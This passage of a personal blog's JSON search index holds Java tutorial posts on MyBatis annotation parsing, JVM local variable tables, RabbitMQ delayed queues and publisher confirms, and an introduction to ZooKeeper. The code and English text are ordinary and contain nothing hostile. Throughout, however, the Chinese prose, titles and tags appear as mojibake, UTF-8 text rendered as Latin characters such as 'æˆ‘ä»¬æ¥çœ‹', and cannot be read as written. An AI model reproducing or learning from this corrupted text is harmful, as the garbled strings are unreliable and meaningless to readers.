æˆ‘ä»¬æ¥çœ‹mybatisä¸­çš„org.apache.ibatis.builder.annotation.MapperAnnotationBuilderä¸­çš„æ–¹æ³•void parseStatement(Method method) void parseStatement(Method method) { final Class&lt;?&gt; parameterTypeClass = getParameterType(method); final LanguageDriver languageDriver = getLanguageDriver(method); getAnnotationWrapper(method, true, statementAnnotationTypes).ifPresent(statementAnnotation -&gt; { // è¿™é‡Œè·å–åˆ°Annotation final SqlSource sqlSource = buildSqlSource(statementAnnotation.getAnnotation(), parameterTypeClass, languageDriver, method); ã€‚ã€‚ã€‚ã€‚ } // æˆ‘ä»¬å¯ä»¥çœ‹åˆ°annotation.value()æ–¹æ³• private SqlSource buildSqlSource(Annotation annotation, Class&lt;?&gt; parameterType, LanguageDriver languageDriver, Method method) { if (annotation instanceof Select) { return buildSqlSourceFromStrings(((Select) annotation).value(), parameterType, languageDriver);","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"åå°„","slug":"åå°„","permalink":"http://yoursite.com/tags/%E5%8F%8D%E5%B0%84/"}]},{"title":"è™šæ‹Ÿæœºæ ˆçš„å±€éƒ¨å˜é‡","slug":"è™šæ‹Ÿæœºæ ˆçš„å±€éƒ¨å˜é‡","date":"2020-07-01T11:11:59.000Z","updated":"2020-11-14T17:10:37.481Z","comments":true,"path":"2020/07/01/è™šæ‹Ÿæœºæ ˆçš„å±€éƒ¨å˜é‡/","link":"","permalink":"http://yoursite.com/2020/07/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88%E7%9A%84%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/","excerpt":"","text":"public class LocalVariableTest { private int count = 0; public static void main(String[] args) { method(); } public static void method() { LocalVariableTest localVariableTest = new LocalVariableTest(); Date date = new Date(); int count = 10; System.out.println(count); } }æˆ‘ä»¬æ¥è§£æä¸€ä¸‹method()è¿™ä¸ªæ–¹æ³• javap -v LocalVariableTest.class // mainæ–¹æ³• public static void main(java.lang.String[]); // å…¥å‚æ˜¯ Stringç±»å‹çš„æ•°ç»„ï¼Œè¿”å›å€¼æ˜¯Void descriptor: ([Ljava/lang/String;)V // æ–¹æ³•ä¿®é¥° public å’Œstatic flags: ACC_PUBLIC, ACC_STATIC Code: stack=0, locals=1, args_size=1 0: invokestatic #3 // Method method:()V 3: return LineNumberTable: line 14: 0 line 15: 3 LocalVariableTable: Start Length Slot Name Signature 0 4 0 args [Ljava/lang/String; public static void method(); // å…¥å‚æ˜¯ç©ºï¼Œè¿”å›å€¼æ˜¯void descriptor: ()V // æ–¹æ³•ä¿®é¥°æ˜¯ public static flags: ACC_PUBLIC, ACC_STATIC Code: stack=2, locals=3, args_size=0 0: new #4 // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest 3: dup 4: invokespecial #5 // Method &quot;&lt;init&gt;&quot;:()V 7: astore_0 8: new #6 // class java/util/Date 11: dup 12: invokespecial #7 // Method java/util/Date.&quot;&lt;init&gt;&quot;:()V 15: astore_1 16: bipush 10 18: istore_2 19: getstatic #8 // Field java/lang/System.out:Ljava/io/PrintStream; 22: iload_2 23: invokevirtual #9 // Method java/io/PrintStream.println:(I)V 26: return // jvmä¸­å¯¹åº”å…³ç³»ï¼Œè­¬å¦‚ javaæ–‡ä»¶ä¸­18è¡ŒLocalVariableTest localVariableTest = new LocalVariableTest(); // å¯¹åº” jvmæŒ‡ä»¤è¡Œ 0 0: new #4 // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest LineNumberTable: line 18: 0 line 19: 8 line 20: 16 line 21: 19 line 22: 26 // å±€éƒ¨å˜é‡è¡¨ï¼šlocalVariableTest ,date,count signatureæ˜¯å¯¹åº”ç€å‡ ä¸ªçš„ç±»å‹ï¼Œä»–ä»¬æ˜¯åœ¨ä¸€ä¸ªæ•°ç»„é‡Œé¢çš„ // localVariableTestæ˜¯æ•°ç»„index 0çš„ä½ç½®ï¼Œdateæ˜¯index 1çš„ä½ç½®countæ˜¯2çš„ä½ç½® // startæ˜¯jvmä¸­å‘å¯¹åº”çš„å±€éƒ¨å˜é‡å¼€å§‹ç”Ÿæ•ˆçš„ä½ç½®ï¼Œlengthæ˜¯æœ‰æ•ˆçš„é•¿åº¦ï¼ˆä¸è¯¦ï¼‰ // jvmæŒ‡ä»¤è¡Œä¸­æ˜¯0-26è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸€å…±27è¡Œï¼Œè€Œstart+lengthéƒ½æ˜¯27 LocalVariableTable: Start Length Slot Name Signature 8 19 0 localVariableTest Lorg/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest; 16 11 1 date Ljava/util/Date; 19 8 2 count I","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"JVM","slug":"JVM","permalink":"http://yoursite.com/tags/JVM/"}]},{"title":"RabbitMQ-å»¶è¿Ÿé˜Ÿåˆ—","slug":"RabbitMQ-å»¶è¿Ÿé˜Ÿåˆ—","date":"2020-05-13T10:43:36.000Z","updated":"2020-11-14T17:10:39.183Z","comments":true,"path":"2020/05/13/RabbitMQ-å»¶è¿Ÿé˜Ÿåˆ—/","link":"","permalink":"http://yoursite.com/2020/05/13/RabbitMQ-%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97/","excerpt":"","text":"RabbitMQå»¶è¿Ÿé˜Ÿåˆ—ä»‹ç»[ å®˜ç½‘ä¸Šçš„ä»‹ç» ](https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-rabbitmq/) å®ç°æ–¹å¼ï¼š æ··åˆä½¿ç”¨message TTL å’Œ Dead Letter Exchanges ä½¿ç”¨ RabbitMQ Delayed Message Plugin æ¥å®ç° æ··åˆä½¿ç”¨Message TTLå’ŒDead Letter Exchanges åˆ©ç”¨dead letter exchangeçš„è§„åˆ™ The message is negatively acknowledged by a consumer using basic.reject or basic.nack with requeue parameter set to false.æ¶ˆè´¹è€…æ‹’ç»æˆ–è€…nack The message expires due to per-message TTL ; or æ¶ˆæ¯ttl The message is dropped because its queue exceeded a length limit æ¶ˆæ¯è¢«ä¸¢å¼ƒç”±äºé˜Ÿåˆ—è¶…è¿‡é•¿åº¦é™åˆ¶ ç”Ÿäº§è€…å‘é€æ¶ˆæ¯ç»™å»¶è¿Ÿäº¤æ¢æœºæ—¶ï¼Œè®©æ¶ˆæ¯è®¾ç½®ç‰¹å®šæ—¶é—´è¿‡æœŸï¼Œè½¬å‘åˆ°å»¶è¿Ÿé˜Ÿåˆ—ã€‚è¿™ä¸ªå»¶è¿Ÿé˜Ÿåˆ—åˆ›å»ºæ—¶ï¼Œå£°æ˜dead letter exchange nameå’Œdeadletter routingkeyã€‚ç”±äºæ²¡æœ‰è®¾ç½®æ¶ˆè´¹è€…ï¼Œå»ç›‘å¬è¿™ä¸ªå»¶è¿Ÿé˜Ÿåˆ—ï¼Œå¯¼è‡´è¿™ä¸ªæ¶ˆæ¯ttlï¼Œæœ€ç»ˆè½¬å‘åˆ°æ­»ä¿¡exchangeï¼Œæ ¹æ®æ­»ä¿¡routingkeyè½¬å‘æ­»ä¿¡é˜Ÿåˆ—ã€‚ï¼ˆè¿™è¾¹çš„ä¾‹å­ï¼Œæˆ‘ä¼šåœ¨ä¸‹é¢ä¸¾ä¾‹ï¼‰ æ¶ˆè´¹è€… # application.yml server: port: 8080 spring: rabbitmq: username: username password: password host: localhost port: 5672 virtual-host: /test @Configuration public class RabbitConfig { private static final String DELAY_QUEUE_NAME = &quot;test_delay_ttl_springboot_queue&quot;; private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;; private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;; private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; private static final String DEAD_EXCHANGE_NAME = &quot;test_dead_ttl_springboot_exchange&quot;; private static final String DEAD_ROUTING_KEY = &quot;test_dead_ttl_springboot_routingkey&quot;; // å»¶è¿Ÿé˜Ÿåˆ— @Bean public Queue dealyQueue(){ Map&lt;String,Object&gt; args = new HashMap&lt;&gt;(); // x-dead-letter-exchange å½“å‰é˜Ÿåˆ—å£°æ˜çš„æ­»ä¿¡è·¯ç”± args.put(&quot;x-dead-letter-exchange&quot;, DEAD_EXCHANGE_NAME); // x-dead-letter-routing-key è¿™é‡Œå£°æ˜å½“å‰é˜Ÿåˆ—çš„æ­»ä¿¡è·¯ç”±key args.put(&quot;x-dead-letter-routing-key&quot;, DEAD_ROUTING_KEY); return QueueBuilder.durable(DELAY_QUEUE_NAME).withArguments(args).build(); } // æ­»ä¿¡queue @Bean public Queue deadQueue(){ return new Queue(DEAD_QUEUE_NAME); } // å»¶è¿Ÿexchange @Bean public DirectExchange delayExchange(){ return new DirectExchange(DELAY_EXCHANGE_NAME); } // æ­»ä¿¡exchange @Bean public DirectExchange deadExchange(){ return new DirectExchange(DEAD_EXCHANGE_NAME); } @Bean public Binding dealyBinding(@Qualifier(&quot;dealyQueue&quot;)Queue queue,@Qualifier(&quot;delayExchange&quot;)Exchange exchange){ return BindingBuilder.bind(queue).to(exchange).with(DELAY_ROUTING_KEY).noargs(); } @Bean public Binding deadBinding(@Qualifier(&quot;deadQueue&quot;)Queue queue,@Qualifier(&quot;deadExchange&quot;)Exchange exchange){ return BindingBuilder.bind(queue).to(exchange).with(DEAD_ROUTING_KEY).noargs(); } } private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;; private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;; @Resource private RabbitTemplate rabbitTemplate; @Override public void sendDelayMsgTTL(String msg, Integer delay) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,msg,msgProcessor-&gt;{ msgProcessor.getMessageProperties().setExpiration(delay.toString()); return msgProcessor; }); } // å‘é€çŸ­ä¿¡ mqService.sendDelayMsgTTL(&quot;hello,i send a delay msg by ttl&quot;,5000);æ¶ˆè´¹è€… æ¶ˆè´¹è€…é…ç½®æ–‡ä»¶å’Œç”Ÿæˆè€…ä¸€æ · private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }è¿è¡Œä¸Šé¢æ¶ˆè´¹è€…ï¼Œå¯ä»¥çœ‹åˆ°5ç§’åæ¶ˆè´¹è€…æ”¶åˆ° é‚£ä¹ˆï¼Œæˆ‘ä»¬æ¥ç›‘å¬å»¶è¿Ÿé˜Ÿåˆ— private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;; @RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); } @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay2(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }å¯ä»¥çœ‹åˆ°ï¼Œç”Ÿäº§è€…å‘é€æ¶ˆæ¯ï¼Œæ¶ˆè´¹è€…ç¬é—´æ”¶åˆ°ã€‚å¹¶ä¸”æ­»ä¿¡é˜Ÿåˆ—ä¸ä¼šç›‘å¬åˆ°æ¶ˆæ¯ã€‚ ä½¿ç”¨RabbitMQ Delayed Message Pluginæ¥å®ç°å»¶è¿Ÿé˜Ÿåˆ—å®‰è£…æ­¥éª¤ å‰å¾€https://www.rabbitmq.com/community-plugins.htmlï¼Œä¸‹è½½ rabbitmq_delayed_message_exchange æ’ä»¶ å°†ä¸‹è½½å¥½çš„æ’ä»¶æ”¾å…¥rabbitmqå®‰è£…ç›®å½•ä¸­çš„plugin æ–‡ä»¶å¤¹ä¸‹ æ‰§è¡Œå‘½ä»¤ rabbitmq-plugins enable rabbitmq_delayed_message_exchange è®©è¯¥pluginå¯ä»¥ä½¿ç”¨ æ’ä»¶å®‰è£…å®Œæ¯•åï¼Œå°±ä¼šæœ‰ä¸€ä¸ªx-delayed-messageç±»å‹çš„exchangeä»£ç  // å£°æ˜é˜Ÿåˆ—å’Œqueue private static final String DELAY_QUEUE_NAME = &quot;test_delay_queue_springboot&quot;; private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_exchange_springboot&quot;; private static final String DELAY_EXCHANGE_ROUTING_KEY = &quot;test_delay_routingkey_springboot&quot;; @Bean public Queue delayQueue(){ return new Queue(DELAY_QUEUE_NAME); } @Bean public CustomExchange customExchange(){ Map&lt;String,Object&gt; args = new HashMap&lt;&gt;(); args.put(&quot;x-delayed-type&quot;,&quot;direct&quot;); return new CustomExchange(DELAY_EXCHANGE_NAME,&quot;x-delayed-message&quot;,true,false,args); } @Bean public Binding binding(@Qualifier(&quot;delayQueue&quot;)Queue queue,@Qualifier(&quot;customExchange&quot;)CustomExchange customExchange){ return BindingBuilder.bind(queue).to(customExchange).with(DELAY_EXCHANGE_ROUTING_KEY).noargs(); } // è®¾ç½®å…·ä½“çš„å»¶è¿Ÿæ—¶é—´ @Override public void sendDelayMsg(String message, Integer delay) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_EXCHANGE_ROUTING_KEY,message,msgProcessor-&gt;{ msgProcessor.getMessageProperties().setDelay(delay); return msgProcessor; }); } // æ¥æ”¶æ¶ˆæ¯ @RabbitListener(queues = DELAY_QUEUE_NAME) public void delay(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); // å¯ä»¥çœ‹åˆ°å…·ä½“å»¶è¿Ÿäº†å¤šå°‘æ—¶é—´ï¼Œå…¶å®ä¹Ÿå°±æ˜¯x-delayè¿™ä¸ªå¤´ System.out.println(message.getMessageProperties().getReceivedDelay()); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); }å¯ä»¥çœ‹åˆ°ä½¿ç”¨æ’ä»¶ä¹Ÿå¯ä»¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ­»ä¿¡ç›¸å…³çš„åŠŸèƒ½æˆ‘ä»¬å‘ç”Ÿä¸€æ¡ä¿¡æ¯åˆ°å»¶è¿Ÿé˜Ÿåˆ—é‡Œé¢ï¼Œç›‘å¬è¿™ä¸ªé˜Ÿåˆ—ï¼Œæ¶ˆè´¹çš„æ—¶å€™æ‹’ç»è¿™ä¸ªæ¶ˆæ¯ï¼Œè¿™æ ·è¿™æ¡æ¶ˆæ¯å°±ä¼šå‘å¾€æ­»ä¿¡é˜Ÿåˆ— // ç”Ÿäº§è€… @Override public void sendMsgUAck(String message) { rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,message); } // æ¶ˆè´¹è€… //ç›‘å¬æ­»ä¿¡é˜Ÿåˆ— @RabbitListener(queues = DEAD_QUEUE_NAME) public void delay2(Message message, Channel channel) throws IOException { String msg = new String(message.getBody(),&quot;UTF-8&quot;); System.out.println(&quot;msg : &quot; + msg); channel.basicAck(message.getMessageProperties().getDeliveryTag(),false); } // ç›‘å¬å»¶è¿Ÿé˜Ÿåˆ— @RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;) public void delay3(Message message, Channel channel) throws IOException { channel.basicNack(message.getMessageProperties().getDeliveryTag(),false,false); System.out.println(&quot;uack message&quot;); }å¯ä»¥çœ‹åˆ°å‘ç”Ÿæ¶ˆæ¯ï¼Œå»¶è¿Ÿé˜Ÿåˆ—æ¶ˆè´¹è€…æ‹’ç»ï¼Œç«‹åˆ»å‘å¾€æ­»ä¿¡é˜Ÿåˆ—ã€‚ï¼ˆæ‰£åº“å­˜ç›¸å…³é€»è¾‘ï¼Œå¯ä»¥å‚è€ƒï¼‰ å‚è€ƒ[ å®˜æ–¹æ–‡æ¡£ ](https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-rabbitmq/) å¼—å…°å…‹çš„çŒ«çš„åšæ–‡","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"RabbitMQ-Publisher Confirms","slug":"RabbitMQ-Publisher Confirms","date":"2020-05-07T09:57:50.000Z","updated":"2020-11-14T17:10:39.683Z","comments":true,"path":"2020/05/07/RabbitMQ-Publisher Confirms/","link":"","permalink":"http://yoursite.com/2020/05/07/RabbitMQ-Publisher%20Confirms/","excerpt":"","text":"Publisher Confirms[ Publisher confirms ](https://www.rabbitmq.com/confirms.html#publisher-confirms) are a RabbitMQ extension to implement reliable publishing. Whenpublisher confirms are enabled on a channel, messages the client publishes areconfirmed asynchronously by the broker, meaning they have been taken care ofon the server side. publisher confirmsæ˜¯ä¸€ä¸ªRabbitMQçš„æ’ä»¶ç”¨äºå®ç°å¯é çš„å‘å¸ƒã€‚å½“publisherconfirmsåœ¨channelä¸Šå¯ç”¨æ—¶ï¼Œbrokerå°†å¼‚æ­¥ç¡®è®¤å®¢æˆ·ç«¯å‘é€çš„ä¿¡æ¯ï¼Œæ„å‘³ç€æœåŠ¡ç«¯æ¥æ”¶åˆ°äº†æ¶ˆæ¯ã€‚ åœ¨channelä¸Šå¯ç”¨publisherconfirmChannel channel = connection.createChannel(); channel.confirmSelect();publishing Message individually å•ç‹¬å‘é€æ¶ˆæ¯private final static String QUEUE_NAME = &quot;test_queue_confirm1&quot;; public static void main(String[] args) throws IOException, TimeoutException, InterruptedException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); // ç”Ÿäº§è€…è°ƒç”¨confirmSelectå°†channelè®¾ç½®ä¸ºconfirmæ¨¡å¼æ³¨æ„ channel.confirmSelect(); String message = &quot;hello confirm message&quot;; channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,message.getBytes()); if(!channel.waitForConfirms()){ System.out.println(&quot;message send failed&quot;); }else{ System.out.println(&quot;message send ok&quot;); } channel.close(); connection.close(); }publishing messages in batches æ‰¹é‡å‘é€æ¶ˆæ¯private final static String QUEUE_NAME = &quot;test_queue_confirm2&quot;; public static void main(String[] args) throws IOException, TimeoutException, InterruptedException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); // ç”Ÿäº§è€…è°ƒç”¨confirmSelectå°†channelè®¾ç½®ä¸ºconfirmæ¨¡å¼æ³¨æ„ // æ‰¹é‡ channel.confirmSelect(); for (int i = 0;i&lt;10;i++) { String message = &quot;hello confirm message &quot; + i; channel.basicPublish(&quot;&quot;, QUEUE_NAME, null, message.getBytes()); } if(!channel.waitForConfirms()){ System.out.println(&quot;message send failed&quot;); }else{ System.out.println(&quot;message send ok&quot;); } channel.close(); connection.close(); }handling publisher confirms asynchronously å¼‚æ­¥åœ°å¤„ç†æ¶ˆæ¯ç¡®è®¤private final static String QUEUE_NAME = &quot;test_queue_confirm4&quot;; public static void main(String[] args) throws IOException, TimeoutException { Connection connection = ConnectionUtils.getConnection(); Channel channel = connection.createChannel(); channel.queueDeclare(QUEUE_NAME,false,false,false,null); channel.confirmSelect(); channel.addConfirmListener(new ConfirmListener() { @Override public void handleAck(long deliveryTag, boolean multiple) throws IOException { System.out.println(&quot;handleAck deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple); } @Override public void handleNack(long deliveryTag, boolean multiple) throws IOException { System.out.println(&quot;handleNack deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple); } }); long nextSeqNo = channel.getNextPublishSeqNo(); channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,&quot;send listener message&quot;.getBytes()); System.out.println(&quot;[send] message&quot; +&quot;send listener message&quot; + &quot;nextSeqNo &quot;+ nextSeqNo ); }æ€»ç»“rabbitMqçš„ackå’Œpublisher confirméœ€è¦åŒºåˆ†å¼€æ¥ã€‚","categories":[],"tags":[{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"http://yoursite.com/tags/RabbitMQ/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"http://yoursite.com/tags/rabbitmq/"}]},{"title":"zookeeper-ç®€ä»‹","slug":"zookeeper-ç®€ä»‹","date":"2020-04-24T10:15:35.000Z","updated":"2020-11-14T17:10:40.154Z","comments":true,"path":"2020/04/24/zookeeper-ç®€ä»‹/","link":"","permalink":"http://yoursite.com/2020/04/24/zookeeper-%E7%AE%80%E4%BB%8B/","excerpt":"","text":"ç®€ä»‹ZooKeeper: A Distributed Coordination Service for Distributed Applications zooKeeper:ä¸€ä¸ªåˆ†å¸ƒå¼åº”ç”¨çš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ ZooKeeper is a distributed, open-source coordination service for distributed applications. It exposes a simple set of primitives that distributed applications can build upon to implement higher level services for synchronization, configuration maintenance, and groups and naming. It is designed to be easy to program to, and uses a data model styled after the familiar directory tree structure of file systems. It runs in Java and has bindings for both Java and C. zooKeeperæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼åº”ç”¨çš„åˆ†å¸ƒå¼ï¼Œå¼€æºï¼Œåè°ƒæœåŠ¡ã€‚å®ƒæä¾›äº†ä¸€ç»„ç®€å•çš„åŸè¯­ï¼Œåˆ†å¸ƒå¼åº”ç”¨å¯ä»¥åœ¨è¿™äº›åŸè¯­åŸºç¡€ä¸Šå®ç°æ›´é«˜çº§çš„æœåŠ¡ï¼Œç”¨äºåŒæ­¥ï¼Œé…ç½®ç»´æŠ¤ï¼Œç»„åˆå‘½åã€‚å®ƒè¢«è®¾è®¡æ˜“äºä½¿ç”¨ï¼Œå¹¶ä½¿ç”¨äº†é£æ ¼å’Œæ–‡ä»¶ç³»ç»Ÿç›¸ä¼¼çš„æ•°æ®æ¨¡å‹ã€‚å®ƒåœ¨javaè¿è¡Œï¼Œå¹¶å…·æœ‰javaå’Œcç»‘å®šã€‚ Coordination services are notoriously hard to get right. They are especially prone to errors such as race conditions and deadlock. The motivation behind ZooKeeper is to relieve distributed applications the responsibility of implementing coordination services from scratch. åè°ƒæœåŠ¡æ˜¯å‡ºäº†åçš„éš¾å†™ã€‚ä»–ä»¬ç‰¹åˆ«å®¹æ˜“å‡ºç°ç«äº‰æ¡ä»¶å’Œæ­»é”é”™è¯¯ã€‚zookeeperèƒŒåçš„åŠ¨æœºæ˜¯ä¸ºäº†å‡å°‘åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä»å¤´å®ç°åè°ƒæœåŠ¡çš„è´£ä»»ã€‚ Design Goals ZooKeeper is simple. ZooKeeper allows distributed processes to coordinate with each other through a shared hierarchical namespace which is organized similarly to a standard file system. The namespace consists of data registers - called znodes, in ZooKeeper parlance - and these are similar to files and directories. Unlike a typical file system, which is designed for storage, ZooKeeper data is kept in-memory, which means ZooKeeper can achieve high throughput and low latency numbers. zooKeeperæ˜¯ç®€å•çš„ã€‚zooKeeperå…è®¸åˆ†å¸ƒå¼è¿›ç¨‹é€šè¿‡å…±äº«çš„å±‚æ¬¡å‘½åç©ºé—´ç›¸äº’åè°ƒï¼Œè¯¥å‘½åç©ºé—´ç±»ä¼¼äºæ ‡å‡†æ–‡ä»¶ç³»ç»Ÿã€‚å‘½åç©ºé—´ç”±æ•°æ®å¯„å­˜å™¨æ³¨å†Œï¼Œç”¨zooKeeperçš„è¯è¯´å«znodesï¼Œç±»ä¼¼äºæ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•å’Œæ–‡ä»¶ã€‚ä¸åƒå…¸å‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œzookeeperæ˜¯è®¾è®¡ç”¨äºä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œæ„å‘³ç€zooKeeperå¯ä»¥å®ç°é«˜ååé‡å’Œä½å»¶è¿Ÿç‡ã€‚ The ZooKeeper implementation puts a premium on high performance, highly available, strictly ordered access. The performance aspects of ZooKeeper means it can be used in large, distributed systems. The reliability aspects keep it from being a single point of failure. The strict ordering means that sophisticated synchronization primitives can be implemented at the client. ZooKeeperå®æ–½å¯¹é«˜æ€§èƒ½ï¼Œé«˜å¯ç”¨æ€§ï¼Œä¸¥æ ¼æœ‰åºè®¿é—®åŠ ä»¥é‡è§†ã€‚ ZooKeeperçš„æ€§èƒ½æ–¹é¢æ„å‘³ç€å®ƒå¯ä»¥åœ¨å¤§å‹çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä½¿ç”¨ã€‚ å¯é æ€§æ–¹é¢ä½¿å®ƒä¸ä¼šæˆä¸ºå•ç‚¹æ•…éšœã€‚ ä¸¥æ ¼æ’åºæ„å‘³ç€å¯ä»¥åœ¨å®¢æˆ·ç«¯ä¸Šå®ç°å¤æ‚çš„åŒæ­¥åŸè¯­ã€‚ ZooKeeper is replicated. Like the distributed processes it coordinates, ZooKeeper itself is intended to be replicated over a set of hosts called an ensemble. ZooKeeperæ˜¯å¤åˆ¶çš„ã€‚ä¸å®ƒæ‰€åè°ƒçš„åˆ†å¸ƒå¼è¿›ç¨‹ä¸€æ ·ï¼ŒZooKeeperæœ¬èº«ä¹Ÿæ‰“ç®—åœ¨ä¸€ç»„ç§°ä¸ºé›†åˆçš„ä¸»æœºä¸Šè¿›è¡Œå¤åˆ¶ã€‚ The servers that make up the ZooKeeper service must all know about each other. They maintain an in-memory image of state, along with a transaction logs and snapshots in a persistent store. As long as a majority of the servers are available, the ZooKeeper service will be available. ç»„æˆZooKeeperæœåŠ¡çš„æœåŠ¡å™¨å¿…é¡»ç›¸äº’äº†è§£ã€‚å®ƒä»¬åœ¨å†…å­˜ä¸­ç»´æŠ¤çŠ¶æ€æ˜ åƒï¼Œä»¥åŠæŒä¹…å­˜å‚¨ä¸­çš„äº‹åŠ¡æ—¥å¿—å’Œå¿«ç…§ã€‚åªè¦å¤§å¤šæ•°æœåŠ¡å™¨å¯ç”¨ï¼ŒZooKeeperæœåŠ¡å°±å¯ç”¨ã€‚ Clients connect to a single ZooKeeper server. The client maintains a TCP connection through which it sends requests, gets responses, gets watch events, and sends heart beats. If the TCP connection to the server breaks, the client will connect to a different server. å®¢æˆ·ç«¯è¿æ¥åˆ°å•ä¸ªZooKeeperæœåŠ¡å™¨ã€‚å®¢æˆ·ç«¯ç»´æŠ¤ä¸€ä¸ªTCPè¿æ¥ï¼Œé€šè¿‡å®ƒå‘é€è¯·æ±‚ã€è·å–å“åº”ã€è·å–ç›‘è§†äº‹ä»¶å’Œå‘é€å¿ƒè·³ã€‚å¦‚æœåˆ°æœåŠ¡å™¨çš„TCPè¿æ¥ä¸­æ–­ï¼Œå®¢æˆ·æœºå°†è¿æ¥åˆ°å¦ä¸€å°æœåŠ¡å™¨ã€‚ ZooKeeper is ordered. ZooKeeper stamps each update with a number that reflects the order of all ZooKeeper transactions. Subsequent operations can use the order to implement higher-level abstractions, such as synchronization primitives. Zookeeperæ˜¯æœ‰åºçš„ã€‚ZooKeeperç”¨ä¸€ä¸ªæ•°å­—æ¥æ ‡è®°æ¯ä¸ªæ›´æ–°ï¼Œè¿™ä¸ªæ•°å­—åæ˜ äº†æ‰€æœ‰ZooKeeperäº‹åŠ¡çš„é¡ºåºã€‚åç»­æ“ä½œå¯ä»¥ä½¿ç”¨è¯¥é¡ºåºå®ç°æ›´é«˜çº§åˆ«çš„æŠ½è±¡ï¼Œæ¯”å¦‚åŒæ­¥åŸè¯­ã€‚ ZooKeeper is fast. It is especially fast in &quot;read-dominant&quot; workloads. ZooKeeper applications run on thousands of machines, and it performs best where reads are more common than writes, at ratios of around 10:1. ZooKeeperå¾ˆå¿«ã€‚åœ¨â€œä»¥è¯»å–ä¸ºä¸»â€çš„å·¥ä½œè´Ÿè½½ä¸­ï¼Œå®ƒçš„é€Ÿåº¦ç‰¹åˆ«å¿«ã€‚ZooKeeperåº”ç”¨ç¨‹åºè¿è¡Œåœ¨æ•°åƒå°æœºå™¨ä¸Šï¼Œå½“è¯»æ“ä½œæ¯”å†™æ“ä½œæ›´å¸¸è§æ—¶ï¼Œå®ƒçš„æ€§èƒ½æœ€å¥½ï¼Œæ¯”ç‡çº¦ä¸º10:1ã€‚ Data model and the hierarchical namespace The namespace provided by ZooKeeper is much like that of a standard file system. A name is a sequence of path elements separated by a slash (/). Every node in ZooKeeper&apos;s namespace is identified by a path. æ•°æ®æ¨¡å‹å’Œåˆ†å±‚åç§°ç©ºé—´ ZooKeeperæä¾›çš„åç§°ç©ºé—´ä¸æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿçš„åç§°ç©ºé—´éå¸¸ç›¸ä¼¼ã€‚ åç§°æ˜¯ç”±æ–œæ ï¼ˆ/ï¼‰åˆ†éš”çš„ä¸€ç³»åˆ—è·¯å¾„å…ƒç´ ã€‚ ZooKeeperå‘½åç©ºé—´ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½ç”±è·¯å¾„æ ‡è¯†ã€‚ Nodes and ephemeral nodes Unlike standard file systems, each node in a ZooKeeper namespace can have data associated with it as well as children. It 